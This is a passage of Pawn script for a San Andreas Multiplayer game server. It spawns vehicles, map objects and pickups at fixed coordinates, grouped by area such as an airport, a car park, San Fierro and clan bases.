AddStaticVehicle(451,-296.1785,1575.9091,75.0684,131.8275,125,125); //
AddStaticVehicle(495,-270.8748,1551.7755,75.6830,134.4523,6,6); //
AddStaticVehicle(495,-268.6550,1548.7106,75.6994,131.8289,1,1); //
AddStaticVehicle(495,-266.3898,1546.2604,75.7147,131.3287,3,3); //
AddStaticVehicle(495,-264.2098,1544.0552,75.7135,133.1902,0,0); //
AddStaticVehicle(451,-2394.6299,-596.7819,132.3545,125.7884,46,46); // Cars Drift Turmiso
AddStaticVehicle(451,-2392.8037,-599.4668,132.3549,307.0936,123,123); // Cars Drift Turmiso
AddStaticVehicle(451,-2391.4617,-601.8436,132.3547,303.2639,36,36); // Cars Drift Turmiso
AddStaticVehicle(451,-2392.2429,-607.9014,132.3545,212.7252,36,36); // Cars Drift Turmiso
AddStaticVehicle(451,-2394.5376,-609.9025,132.3549,214.5427,36,36); // Cars Drift Turmiso
AddStaticVehicle(451,-2399.5781,-613.1229,132.3577,215.3579,36,36); // Cars Drift Turmiso
AddStaticVehicle(451,-2416.8135,-588.8311,132.3573,215.3587,36,36); // Cars Drift Turmiso
AddStaticVehicle(451,-2409.1899,-583.8365,132.3553,35.2171,36,36); // Cars Drift Turmiso
//main:
print("--- Add Main Car ---");
AddStaticVehicle(565,1555.8459,2751.5300,10.4462,269.6317,62,62); //
AddStaticVehicle(545,1597.0334,2834.4602,10.6313,0.0475,40,96); //
AddStaticVehicle(411,2297.7175,2528.5786,10.5368,270.3729,22,22); //
AddStaticVehicle(522,1893.8524,2115.7625,10.4177,359.9979,75,1); //
AddStaticVehicle(545,1634.2186,2082.1187,10.9931,269.5952,53,53); //
AddStaticVehicle(422,1413.9534,714.5236,10.8120,89.4846,16,0); //
AddStaticVehicle(603,982.2697,1730.0231,8.3916,270.6754,51,1); //
AddStaticVehicle(463,1021.3074,2020.6182,10.6648,262.1683,36,36); //
AddStaticVehicle(461,1310.5831,2578.5259,10.4116,157.6011,36,1); //
AddStaticVehicle(461,1234.3383,2606.2632,10.4020,64.9231,79,1); //
AddStaticVehicle(411,1640.3064,2576.4785,10.5545,359.4968,106,1); //
AddStaticVehicle(461,1636.1115,2576.2866,10.4060,6.8278,61,1); //
AddStaticVehicle(603,2100.6445,1397.7743,10.6583,359.7213,45,45); //
AddStaticVehicle(451,2603.4785,2142.9934,10.5252,89.5199,126,0); //
AddStaticVehicle(541,2426.8665,2131.0986,10.3688,88.8057,58,8); //
AddStaticVehicle(479,2361.7429,648.4590,11.1009,0.2114,54,31); //
AddStaticVehicle(603,2114.4250,901.8270,10.6250,271.0256,37,0); //
AddStaticVehicle(429,2393.7859,987.6761,10.5000,91.1308,2,1); //
AddStaticVehicle(411,2492.3496,1232.0537,10.7027,92.0766,6,6); //
AddStaticVehicle(415,2461.6316,1345.9426,10.5989,178.7844,62,1); //
AddStaticVehicle(400,2441.6130,1351.7134,10.5474,89.8914,112,1); //
AddStaticVehicle(558,2525.6709,1456.8545,10.4731,358.5329,36,1); //
AddStaticVehicle(400,2470.4424,1428.6765,10.5533,177.9176,101,101); //
AddStaticVehicle(480,2372.7192,1648.5884,10.9127,0.0007,101,1); //
AddStaticVehicle(400,2565.8206,1671.4277,10.5468,87.5994,53,1); //
AddStaticVehicle(415,2186.9312,2000.2557,10.6915,269.8876,93,64); //
AddStaticVehicle(522,2142.0264,1408.3706,10.4099,194.4707,61,1); //
AddStaticVehicle(567,2075.4434,1005.0959,10.5453,0.6719,97,96); //
AddStaticVehicle(565,2182.4255,1286.8412,10.3682,0.6061,10,10); //
AddStaticVehicle(545,2619.3079,2099.2168,10.6276,359.8427,28,96); //
AddStaticVehicle(506,2119.2561,1924.6890,10.3762,179.9013,3,3); //
AddStaticVehicle(451,2507.0249,2131.2458,10.4495,90.6109,125,125); //
AddStaticVehicle(541,2029.5710,1912.6765,11.9289,0.8390,58,8); //
AddStaticVehicle(560,1661.8137,988.1861,10.5577,359.4649,12,1); //
AddStaticVehicle(451,2563.9819,2275.1680,10.5272,90.0273,36,36); //
AddStaticVehicle(422,1624.0474,687.7905,10.4453,268.0920,8,8); //
AddStaticVehicle(541,1399.5751,973.1689,10.4433,358.6299,58,8); //
AddStaticVehicle(415,1881.7091,957.6345,10.4454,90.5756,58,8); //
AddStaticVehicle(560,1881.5790,966.7969,10.4453,91.4834,7,7); //
AddStaticVehicle(451,2038.7554,928.7838,8.9050,180.4548,60,60); //
AddStaticVehicle(451,2217.1121,1838.6136,10.4453,178.6115,1,1); //
AddStaticVehicle(400,2169.0996,1787.4244,10.4451,178.6473,0,0); //
AddStaticVehicle(463,2588.6907,2071.0215,10.4378,269.7279,0,0); //
AddStaticVehicle(400,2821.8601,2161.4551,10.4452,267.4652,58,18); //
AddStaticVehicle(468,1876.2561,2674.1755,10.4693,91.1653,68,8); //
AddStaticVehicle(560,1358.0430,2644.5254,10.4452,176.5554,68,8); //
AddStaticVehicle(506,1963.8176,1098.2622,10.3688,88.4614,0,0); //
AddStaticVehicle(400,2504.1506,1400.6128,10.4452,268.0431,36,36); //
AddStaticVehicle(451,2476.1882,2496.6238,10.4453,0.7559,1,1); //
AddStaticVehicle(541,1976.4221,2049.4558,10.4451,92.4529,2,1); //
//
AddStaticVehicle(451,2072.3340,824.2792,6.6042,39.6250,65,65); // a new race
AddStaticVehicle(451,2068.1316,823.8341,6.6358,30.0972,44,44); // a new race
AddStaticVehicle(451,2063.9031,823.7260,6.6593,26.6140,100,100); // a new race
AddStaticVehicle(451,2060.0249,823.3692,6.6860,29.1756,101,101); // a new race
AddStaticVehicle(451,2056.3799,822.9109,6.7383,29.6953,42,43); // a new race
AddStaticVehicle(451,2077.9331,822.2661,6.8169,6.7957,42,43); // a new race
AddStaticVehicle(451,2051.0386,822.0812,6.8364,353.0449,65,65); // a new race
AddStaticVehicle(411,2029.3549,878.9312,6.9774,230.8634,100,100); // a new race
AddStaticVehicle(411,2029.4150,883.7412,7.1132,235.3018,101,101); // a new race
AddStaticVehicle(411,2029.6583,888.3423,7.2552,232.8748,42,43); // a new race
AddStaticVehicle(411,2029.8496,892.7136,7.4138,236.0790,120,120); // a new race
AddStaticVehicle(411,2029.5662,897.5767,7.6078,238.0455,86,86); // a new race
AddStaticVehicle(541,2084.6265,891.5067,7.2857,92.3002,83,1); // a new race
AddStaticVehicle(541,2084.6340,887.9623,7.1503,90.9877,65,19); // a new race
AddStaticVehicle(541,2084.7515,883.4325,6.9504,91.9084,48,47); // a new race
AddStaticVehicle(541,2084.4756,879.6880,6.8657,87.9914,43,57); // a new race
AddStaticVehicle(541,2084.6726,874.7379,6.7724,91.6708,2,7); // a new race
//ramp:
print("--- Add Zibori || RAMP ---");
AddStaticVehicle(522,1863.7234,-1394.6096,13.0498,268.9947,6,25); //
AddStaticVehicle(522,1863.8091,-1395.6031,13.0358,267.8712,7,79); //
AddStaticVehicle(522,1863.7592,-1396.6364,13.0446,267.8714,8,82); //
AddStaticVehicle(522,1863.7101,-1397.6697,13.0417,267.8644,36,105); //
AddStaticVehicle(522,1863.6615,-1398.7030,13.0409,267.8569,39,106); //
AddStaticVehicle(522,1863.6136,-1399.7357,13.0429,267.8431,51,118); //
AddStaticVehicle(522,1863.6149,-1400.7690,13.0617,267.6460,3,3); //
AddStaticVehicle(522,1863.7233,-1401.7936,13.0388,267.1754,6,25); //
AddStaticVehicle(522,1863.6193,-1368.1034,13.0692,269.7050,3,8); //
//sf:
print("--- SF ---");
AddStaticVehicle(522,-2127.3245,921.5478,79.4633,92.1626,6,25); // SF
AddStaticVehicle(522,-2127.3750,922.9311,79.4641,87.2319,3,8); // SF
AddStaticVehicle(411,-2132.0881,947.2928,79.7307,90.0918,112,1); // SF
AddStaticVehicle(415,-2157.3220,942.0902,79.7946,271.1154,40,1); // SF
AddStaticVehicle(567,-2157.1763,960.2584,79.8812,273.6577,93,64); // SF
AddStaticVehicle(429,-2157.5254,979.3373,79.6877,270.1491,121,1); // SF
AddStaticVehicle(567,-2129.5107,983.3160,79.8782,89.3217,97,96); // SF
AddStaticVehicle(541,-2128.5823,1000.5756,79.6587,89.7448,68,8); // SF
AddStaticVehicle(429,-2157.4067,1043.6145,79.6886,270.4753,0,1); // SF
AddStaticVehicle(506,-2128.7849,1074.2433,79.7140,89.8052,76,76); // SF
AddStaticVehicle(522,-2186.4243,1081.2009,79.5667,359.0865,92,101); // SF
AddStaticVehicle(411,-2184.3689,1166.0796,55.4306,359.1265,80,1); // SF
AddStaticVehicle(535,-2136.1917,1341.4630,6.9402,90.1785,66,1); // SF
AddStaticVehicle(522,-2070.7764,1435.4282,6.6785,129.3492,3,8); // SF
AddStaticVehicle(522,-2068.1008,1435.0133,6.6714,153.4597,3,3); // SF
AddStaticVehicle(522,-2065.8896,1434.9078,6.6669,147.6570,51,118); // SF
AddStaticVehicle(522,-2063.2158,1434.3868,6.6758,147.7305,39,106); // SF
AddStaticVehicle(434,-2079.6504,1431.7010,7.0726,179.3999,7,7); // SF
AddStaticVehicle(522,-2094.5068,1435.2961,6.6512,220.0089,6,25); // SF
AddStaticVehicle(522,-2092.0010,1435.1561,6.6419,225.3108,7,79); // SF
AddStaticVehicle(522,-2089.6650,1435.2745,6.6569,227.3090,8,82); // SF
AddStaticVehicle(522,-2087.6350,1435.6858,6.6765,232.0600,36,105); // SF
AddStaticVehicle(522,-2008.2341,1348.2291,6.7513,184.8199,61,0); // SF
AddStaticVehicle(522,-1741.9467,1427.6521,6.7335,163.8017,3,8); // SF
AddStaticVehicle(535,-1617.9445,1243.2333,6.9307,45.4288,31,1); // SF
AddStaticVehicle(451,-1653.0925,1196.0984,9.1730,87.6615,61,61); // SF
AddStaticVehicle(506,-1767.9700,1113.1716,45.1247,180.4016,7,7); // SF
AddStaticVehicle(451,-1740.5314,1113.0093,45.1373,178.8847,125,125); // SF
AddStaticVehicle(411,-1706.2128,1059.3447,44.8467,359.7051,68,8); // SF
AddStaticVehicle(429,-1759.1108,1196.1940,24.7267,95.7258,75,1); // SF
AddStaticVehicle(541,-1522.3036,881.8875,6.8368,353.8466,51,1); // SF
AddStaticVehicle(560,-1593.6697,860.7028,7.3635,89.5086,33,0); // SF
AddStaticVehicle(599,-1593.7565,652.8143,7.3341,3.0065,0,1); // SF
AddStaticVehicle(599,-1616.5988,652.6476,7.3808,359.0590,0,1); // SF
AddStaticVehicle(490,-1611.7207,672.9122,7.3373,180.0442,0,0); // SF
AddStaticVehicle(599,-1594.2222,672.8608,7.3320,178.7705,0,1); // SF
AddStaticVehicle(490,-1572.6843,718.3537,-5.1018,90.0474,0,0); // SF
AddStaticVehicle(523,-1608.2788,675.0848,-5.6590,218.2191,0,0); // SF
AddStaticVehicle(490,-1608.3636,692.7838,-5.0923,179.6678,0,0); // SF
AddStaticVehicle(427,-1628.6597,692.4866,-5.1109,179.8135,0,1); // SF
AddStaticVehicle(523,-1620.6101,663.4132,-5.6567,293.3784,0,0); // SF
AddStaticVehicle(427,-1638.8004,653.7402,-5.1254,271.4348,0,1); // SF
AddStaticVehicle(560,-1721.2943,605.7745,24.6172,299.5081,17,1); // SF
AddStaticVehicle(541,-1846.8638,614.7121,34.8193,89.8988,36,8); // SF
AddStaticVehicle(506,-1967.1625,723.3738,45.0988,269.2613,76,76); // SF

//AirPort:
print("--- AIRPORT ---");
AddStaticVehicle(519,-1338.8678,-268.7163,15.0692,251.6111,1,1); // Shamal Airport
AddStaticVehicle(519,-1326.1342,-257.7578,15.0702,185.2225,1,1); // Shamal Airport
AddStaticVehicle(519,-1304.3038,-254.7136,15.0668,316.6168,1,1); // Shamal Airport
AddStaticVehicle(548,-1259.7415,-57.9322,15.8302,46.6097,1,1); //
AddStaticVehicle(548,-1251.3929,-49.0816,15.8230,44.4251,1,1); //
AddStaticVehicle(563,-1241.8896,-40.8119,14.8631,45.2537,1,6); //
AddStaticVehicle(563,-1233.3361,-32.7670,14.8391,44.2872,1,1); //
AddStaticVehicle(417,-1263.6996,7.4491,14.2692,134.4979,1,1); //
AddStaticVehicle(417,-1282.9351,26.5926,14.2695,136.2418,1,1); //
AddStaticVehicle(519,-1375.6418,-172.0864,15.0674,273.6486,1,1); //
AddStaticVehicle(519,-1376.1324,-191.9553,15.0720,272.6317,1,1); //
AddStaticVehicle(519,-1386.3698,-216.1764,15.0735,279.9938,1,1); //
AddStaticVehicle(578,-1492.3459,-252.7125,14.7959,2.4415,1,1); //
AddStaticVehicle(578,-1506.7490,-252.8263,14.7960,4.4244,1,1); //
AddStaticVehicle(513,-1569.8204,-275.6017,14.6690,41.9383,1,0); //
AddStaticVehicle(512,-1581.9386,-287.8921,14.4226,48.9378,1,0); //
AddStaticVehicle(513,-1594.7937,-300.2328,14.7129,46.5799,0,1); //
AddStaticVehicle(469,-1612.7439,-323.4285,14.1406,49.0700,88,8); //
AddStaticVehicle(469,-1621.8625,-333.0560,14.1482,50.4738,88,8); //
AddStaticVehicle(469,-1630.4789,-341.6889,14.1656,44.4179,88,8); //
AddStaticVehicle(593,-1249.2153,-80.3928,14.6389,133.8089,1,1); //
AddStaticVehicle(593,-1238.8232,-90.3962,14.6184,135.7558,1,1); // DODO
AddStaticVehicle(593,-1228.9781,-100.1826,14.6179,135.5890,1,1); // DODO
AddStaticVehicle(487,-1214.7501,-127.8887,14.2964,134.5894,0,0); // DODO
AddStaticVehicle(487,-1207.1667,-135.4339,14.2830,136.6128,0,0); // DODO
AddStaticVehicle(487,-1199.2516,-143.0384,14.2841,135.6160,0,0); // DODO
AddStaticVehicle(487,-1190.7439,-151.4983,14.2850,135.3258,0,0); // DODO
AddStaticVehicle(443,-1326.5959,-362.4462,14.8082,187.5062,0,0); // DODO
AddStaticVehicle(485,-1445.8224,-202.7077,13.8196,72.1654,0,0); //
AddStaticVehicle(485,-1442.9149,-195.1141,13.8078,62.5425,0,0); //
AddStaticVehicle(485,-1440.4270,-187.8989,13.7961,74.4890,0,0); //
AddStaticVehicle(485,-1438.0161,-181.0486,13.8187,66.9574,0,0); //
AddStaticVehicle(476,-1466.6299,-522.3833,14.8650,234.1439,0,1); //
AddStaticVehicle(593,-1447.7992,-512.4380,14.6481,204.2692,0,0); //
AddStaticVehicle(476,-1430.3558,-504.1905,14.8637,177.4718,1,0); //
//CarPark:
print("--- CarParking ---");
AddStaticVehicle(451,-1872.1511,-874.4136,31.7304,269.7858,42,43); // CarPark
AddStaticVehicle(451,-1871.8708,-890.3043,31.7303,269.7699,42,43); // CarPark
AddStaticVehicle(451,-1871.8640,-900.0626,31.7303,267.4573,42,43); // CarPark
AddStaticVehicle(522,-1888.4930,-883.8093,31.5887,88.9210,6,25); // Nrg 500 carpark
AddStaticVehicle(522,-1885.7936,-918.4160,31.5835,90.9992,6,25); // Nrg 500 carpark
AddStaticVehicle(560,-1872.0295,-893.6117,31.7441,270.1748,37,0); // /carparkcar
AddStaticVehicle(560,-1871.9204,-897.0663,31.7441,270.0742,33,0); // /carparkcar
AddStaticVehicle(541,-1871.6267,-903.6390,31.6475,270.5792,60,1); // /carparkcar
AddStaticVehicle(541,-1871.6360,-906.3990,31.6702,267.7623,68,8); // /carparkcar
AddStaticVehicle(541,-1871.7286,-909.4115,31.6491,267.0488,2,1); // /carparkcar
AddStaticVehicle(402,-1871.7810,-915.7357,31.8638,269.2672,75,1); // /carparkcar
AddStaticVehicle(402,-1872.0200,-921.7950,31.8648,262.0683,0,1); // /carparkcar
//BusTrip || Ship Strip:
print("--- BUSTRIP && SHIPTRIP ---");
AddStaticVehicle(452,-2312.3179,2313.6309,-0.5744,180.0348,1,3); // shiptripcar
AddStaticVehicle(452,-2312.9731,2296.2407,-0.4951,174.5892,1,3); // shiptripcar
AddStaticVehicle(452,-2309.2078,2284.2944,-0.4638,211.1719,1,3); // shiptripcar
AddStaticVehicle(452,-2302.3416,2264.3130,-0.6332,177.7998,1,3); // shiptripcar
AddStaticVehicle(452,-2300.4570,2232.7966,-0.4514,179.6083,1,3); // shiptripcar
AddStaticVehicle(437,-2446.9626,2240.6790,4.9573,0.8033,105,80); // /bustrip
AddStaticVehicle(437,-2440.9917,2240.7529,4.9324,0.1807,98,80); // /bustripcar
AddStaticVehicle(437,-2458.7395,2226.5779,4.9937,180.6802,95,16); // /bustripcar
AddStaticVehicle(437,-2464.6602,2226.4697,4.9936,180.5578,87,7); // /bustripcar
AddStaticVehicle(437,-2470.7017,2226.5051,4.9432,180.2185,79,7); // /bustripcar
AddStaticVehicle(431,-2482.5310,2226.5181,4.9540,180.0431,75,59); // /bustripcar
AddStaticVehicle(538,2864.7500,1285.0447,11.2473,0.0000,1,71);
//ship(`goat`):
//=[OtherCar`s]========================================================================
print("--- Other CAR ---");
AddStaticVehicle(448,2103.2952,943.2202,10.4132,93.8372,3,6); // PizzaBoy Near RACE
AddStaticVehicle(448,2134.1360,881.7591,10.1374,87.8575,3,6); // PizzaBoy Near RACE
AddStaticVehicle(522,2623.8169,1139.7377,10.3963,271.0921,51,118); // NRG-500
AddStaticVehicle(522,-317.4746,1516.2584,74.9275,179.9636,51,118); // NRG-500 "/Dj"
AddStaticVehicle(531,-1199.3906,1818.3378,41.6854,223.7911,36,2); // Tracktor
AddStaticVehicle(571,-1564.7216,1044.2661,6.4714,359.9944,40,35); // KART SF
AddStaticVehicle(448,-1805.5404,942.7126,24.4869,126.4897,3,6); // PIZZA BOY
print("--- END ADD CAR! ---");

//JUMP
AddStaticVehicle(468,-672.1821,2304.1675,134.5549,74.2891,93,93); // Jump Sanzhez
AddStaticVehicle(468,-672.1043,2301.3303,134.5724,88.4373,86,86); // Jump Sanzhez 2
AddStaticVehicle(568,-679.0502,2329.2925,133.4336,72.1006,1,1); // Jump Bandito
AddStaticVehicle(568,-677.8904,2332.1118,133.6581,74.1763,1,1); // Jump Bandito 2
AddStaticVehicle(539,-689.9789,2364.3193,128.0947,79.9547,6,6); // Vortex


//=ParkPet
//
//CreateStreamObject(1634,1563.422729 -2473.558594 13.852005,0,0,0);
print("--- Add Objective ---");
//=[ObjectStreamers]====================================================================
//Other:
//Gre==========

CreateStreamObject(8355, 1300.0819, 2159.8288, 10.0253, 0.0, 270.6185, 0.0,100);
CreateStreamObject(8355, 1359.2493, 2103.2255, 10.0193, 0.0, 268.0403, 90.0,100);
CreateStreamObject(8355, 1397.517, 2131.4462, 10.0175, 0.0, 270.6185, 0.0,100);
CreateStreamObject(8355, 1330.1335, 2199.0385, 10.0253, 0.0, 269.759, 90.0,100);
CreateStreamObject(7416, 1349.4133, 2150.35, 27.6626, 0.0, 0.0, 0.0,100);
CreateStreamObject(3819, 1306.2847, 2190.8112, 11.0211, 0.0, 0.0, 146.25,100);
CreateStreamObject(972, 1398.4399, 2167.4882, 24.3673, 0.0, 269.759, 0.0,100);
CreateStreamObject(972, 1372.2092, 2199.3403, 24.3923, 0.0, 268.8996, 90.0,100);
CreateStreamObject(3359, 1385.0584, 2106.1877, 10.0171, 0.0, 0.0, 0.0,100);
CreateStreamObject(11442, 1311.9328, 2112.3366, 10.1893, 0.0, 0.0, 90.0,100);
CreateStreamObject(11443, 1338.3316, 2190.4331, 10.1951, 0.0, 0.0, 326.25,100);
CreateStreamObject(11446, 1391.2978, 2152.9643, 10.1983, 0.0, 0.0, 0.0,100);
CreateStreamObject(11445, 1349.0135, 2144.1896, 10.1873, 0.0, 0.0, 0.0,100);
CreateStreamObject(11458, 1306.6287, 2154.4833, 10.1953, 0.0, 0.0, 56.25,100);
CreateStreamObject(11457, 1381.4346, 2186.9213, 9.6246, 0.0, 0.0, 90.0,100);

//=[Gatebank]=============================================================
gateb = CreateStreamObject(2634,2144.19,1627.1,994.257,0,0,180,100);
CreateStreamObject(18102,2144.6033,1633.9343,1000.5761, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(18102,2144.7549,1637.3738,1000.5761, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(18102,2143.8271,1639.9248,1000.5761, 0.0000, 0.0000, 0.0000,100);

//=[NM]===================================================================
CreateStreamObject(3475, 1210.949219, -2068.997314, 70.383987, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(3475, 1211.114746, -2063.203857, 70.383987, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(3475, 1211.113892, -2057.442871, 70.383987, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(3475, 1211.089600, -2051.669922, 70.376785, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(3475, 1211.080566, -2020.649536, 70.376785, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(3475, 1211.108643, -2026.518311, 70.383987, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(3749, 1211.071533, -2039.218872, 73.866226, 0.0000, 0.0000, 270.0000,100);
CreateStreamObject(3475, 1211.024902, -2014.849731, 70.383987, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(3475, 1211.004517, -2009.111694, 70.376785, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(3475, 1210.994141, -2003.416504, 70.345108, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(7371, 1100.443970, -1994.775269, 68.007637, 0.0000, 0.0000, 90.0000,100);
CreateStreamObject(3475, 1211.048950, -1997.756592, 70.383987, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(7371, 1103.563843, -2084.433105, 68.007637, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(7371, 1090.585815, -2077.209473, 68.007637, 0.0000, 0.0000, 90.0000,100);
CreateStreamObject(3475, 1210.683105, -2074.579834, 70.383987, 0.0000, 0.0000, 180.0000,100);
NM1=CreateStreamObject(980, 1211.504272, -2039.203613, 70.732048, 0.0000, 0.0000, 270.0000,100);
CreateStreamObject(3528, 1123.856323, -2037.093750, 76.761993, 0.0000, 0.0000, 348.7500,100);
CreateStreamObject(7388, 1175.384033, -2037.043457, 75.823723, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(16776, 1193.464966, -2024.164063, 69.758652, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(16776, 1193.898193, -2050.831543, 69.758652, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(3268, 1151.475830, -2050.470703, 68.000610, 0.0000, 0.0000, 270.0000,100);
CreateStreamObject(6865, 1214.172241, -2038.626221, 76.516159, 0.0000, 0.0000, 135.0000,100);
NM2=CreateStreamObject(972, 1153.494507, -2044.161255, 67.997490, 0.0000, 0.0000, 90.0000,100);
CreateStreamObject(14791, 1162.965332, -2056.957031, 70.052872, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(16644, 1138.704224, -2060.486572, 62.952339, 0.0000, 89.3814, 270.0000,100);
CreateStreamObject(16644, 1136.560791, -2044.012573, 63.009621, 0.0000, 89.3814, 191.2500,100);
CreateStreamObject(13592, 1164.596680, -2010.810669, 78.603363, 0.0000, 5.1566, 6.0161,100);
CreateStreamObject(1634, 1154.022461, -2013.148560, 70.780190, 9.4538, 0.8594, 89.1405,100);
CreateStreamObject(1634, 1154.023926, -2017.000854, 70.805099, 9.4538, 0.8594, 89.1405,100);
CreateStreamObject(7392, 1093.503662, -2037.950317, 89.164345, 0.0000, 0.0000, 168.7500,100);
CreateStreamObject(7916, 1132.864258, -2043.023804, 68.560570, 0.0000, 0.0000, 89.0632,100);
CreateStreamObject(8492, 1151.632202, -2041.121338, 78.934090, 0.0000, 0.0000, 146.2500,100);
CreateStreamObject(14666, 1152.647217, -2060.376709, 71.319122, 0.0000, 1.7189, 88.2038,100);
CreateStreamObject(2628, 1157.482422, -2059.700684, 68.001854, 0.0000, 0.0000, 180.0000,100);
CreateStreamObject(2630, 1154.540649, -2059.574951, 68.002487, 0.0000, 0.0000, 180.0000,100);



NM3=CreateStreamObject(2714, 1150.846802, -2040.520508, 74.581955, 0.0000, 0.0000, 180.0000,100);

AddStaticVehicle(520,1118.1322,-2017.9768,75.4202,355.5695,0,0); //
AddStaticVehicle(487,1116.5709,-2054.8691,74.6064,357.6069,8,0); //
AddStaticVehicle(411,1142.6869,-2057.7056,68.7277,0.9551,0,0); //
AddStaticVehicle(451,1146.3794,-2057.5659,68.7064,0.7998,1,1); //
AddStaticVehicle(541,1150.8391,-2057.4458,68.6291,0.1536,8,3); //
AddStaticVehicle(522,1164.8939,-2045.0336,68.5785,89.9877,51,118); //
AddStaticVehicle(522,1164.8314,-2047.5616,68.5767,92.0948,7,79); //
AddStaticVehicle(522,1164.8862,-2050.3418,68.5818,93.0788,6,25); //

AddStaticPickup(1240,2, 1137.3998,-2057.3247,69.0006);
AddStaticPickup(1242,2, 1137.3998,-2056.3247,69.0006);
AddStaticPickup(325,2, 1137.3998,-2055.3247,69.0006);
AddStaticPickup(371,2, 1137.3998,-2054.3247,69.0006);

AddStaticVehicle(471,2022.9384,1327.5214,10.3123,269.1072,1,1); // Quad LV
AddStaticVehicle(589,2024.4425,1334.6178,10.1966,271.2565,93,93); // Club LV
AddStaticVehicle(589,2025.0073,1350.5670,10.2487,270.4885,3,3); // Club LV
AddStaticVehicle(418,2037.2524,1353.0051,10.8292,182.9488,93,93); // Moobeam
AddStaticVehicle(434,2037.6342,1332.9471,10.7058,180.6889,5,5); // The Back Is Moobeam Now This Hotknife "/lv"
AddStaticVehicle(434,2037.4750,1312.7150,10.7116,180.9767,5,5); // The Back Is Hotknife Now This Hotknife "/lv"
AddStaticVehicle(434,1921.0958,1268.7159,10.7046,90.0126,5,5); // HotKnife
AddStaticVehicle(411,2141.9824,1006.0000,10.5656,89.9999,112,1); // Infernus Near Race
AddStaticVehicle(411,2141.9824,1009.5645,10.5656,89.9999,112,1); // Infernus Near Race
AddStaticVehicle(411,2141.9824,1028.9716,10.5656,89.9999,112,1); // Infernus Near Race
AddStaticVehicle(506,2132.5759,1025.6621,10.5247,268.9935,6,6); // Super GT Near Race
AddStaticVehicle(411,2132.9597,1022.2715,10.5474,89.8886,5,7); // Infernus Near Race
AddStaticVehicle(409,2165.0129,1019.6796,10.6321,0.4157,0,0); // Stretch
AddStaticVehicle(483,2119.7434,1002.1898,10.8192,180.6715,1,1); // Camper Near Race
AddStaticVehicle(451,2037.7672,1686.2991,10.4514,357.5176,123,123); // Toutismo Near MShip
AddStaticVehicle(451,2232.7896,1878.7345,10.5291,2.6349,123,123); // Toutismo Near MShip
AddStaticVehicle(407,2292.4670,2376.7817,10.9775,182.0383,3,1); // Firetruck Near
AddStaticVehicle(522,-2741.8784,350.6981,3.9880,93.3022,7,7); // NRG500 SF
AddStaticVehicle(522,-2742.2024,346.8197,3.9975,90.2056,0,0); // NRG500 SF
AddStaticVehicle(468,-2678.1604,268.1653,4.0072,356.8907,3,3); // sANCHEZ
AddStaticVehicle(425,-2705.2852,83.8269,4.8315,261.7350,43,0); // Hunter SF
AddStaticVehicle(524,679.6238,839.6711,-42.0283,63.0826,1,1); // Cement Truck

//=[Clan IDF]=========================
  	CreateStreamObject(8209, -2663.424072, 1406.792236, 57.913528, 0.0000, 0.0000, 89.3814,100);
	CreateStreamObject(8209, -2664.453125, 1329.881104, 57.816051, 0.0000, 0.0000, 89.3814,100);
	CreateStreamObject(8209, -2709.499512, 1407.409790, 9.216513, 0.0000, 0.0000, 89.3814,100);
	CreateStreamObject(8210, -2681.206299, 1457.082886, 9.202589, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(8210, -2630.550537, 1450.552734, 9.389540, 0.0000, 0.0000, 347.1084,100);
	CreateStreamObject(8210, -2597.334717, 1418.401123, 9.335836, 0.0000, 0.0000, 285.2290,100);
	CreateStreamObject(8210, -2663.856689, 1306.776367, 9.211924, 0.0000, 0.0000, 180.3777,100);
	CreateStreamObject(8210, -2616.400146, 1326.641113, 8.913532, 0.0000, 0.0000, 224.2091,100);
	CreateStreamObject(3749, -2590.514893, 1353.527954, 11.913087, 0.0000, 0.0000, 43.8313,100);
	CreateStreamObject(8210, -2588.875732, 1386.030029, 9.215311, 0.0000, 0.0000, 285.2290,100);
	CreateStreamObject(3627, -2640.825928, 1346.962280, 9.978813, 0.0000, 0.0000, 0.8594,100);
	CreateStreamObject(13725, -2601.778076, 1444.587280, 25.006990, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(16151, -2639.814453, 1397.843018, 6.485503, 0.0000, 0.0000, 105.7108,100);
	CreateStreamObject(14791, -2667.505127, 1451.593262, 8.146624, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(10281, -2658.372070, 1345.882446, 11.172894, 0.0000, 0.0000, 90.2409,100);
	CreateStreamObject(8644, -2650.940918, 1395.486572, 16.209122, 0.0000, 0.0000, 132.3533,100);
	CreateStreamObject(3279, -2609.663574, 1342.040894, 6.270929, 0.0000, 0.0000, 136.5463,100);
	CreateStreamObject(3279, -2694.197021, 1452.264648, 6.177179, 0.0000, 0.0000, 268.7962,100);
	CreateStreamObject(711, -2650.757080, 1382.905029, 12.165112, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(14467, -2627.798584, 1382.590942, 8.912455, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(13667, -2650.950684, 1366.480713, 46.762283, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(8492, -2633.624268, 1352.493408, 16.206100, 0.0000, 0.0000, 56.7228,100);
	CreateStreamObject(8483, -2678.797607, 1366.285156, 10.847933, 0.0000, 0.0000, 91.9597,100);
	CreateStreamObject(7392, -2630.912842, 1407.156128, 33.282574, 0.0000, 0.0000, 345.3896,100);
	CreateStreamObject(7388, -2655.313232, 1309.391235, 6.012346, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(7073, -2601.494873, 1444.239258, 53.252739, 0.0000, 0.0000, 286.9479,100);
	CreateStreamObject(6865, -2588.168457, 1351.373047, 14.113184, 0.0000, 0.0000, 88.5220,100);
